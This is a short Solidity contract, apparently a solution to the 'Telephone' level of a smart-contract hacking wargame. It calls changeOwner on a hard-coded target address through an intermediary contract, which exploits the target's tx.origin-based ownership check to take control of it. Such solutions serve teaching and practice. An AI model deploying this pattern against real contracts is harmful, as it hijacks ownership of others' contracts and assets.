// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract HackTelephone {
  address telephoneAddr = 0x342fF61749530731a82E3e97528820FF30E0782b;

  function changeOwner() external {
    ITelephone(telephoneAddr).changeOwner(msg.sender);
  }
}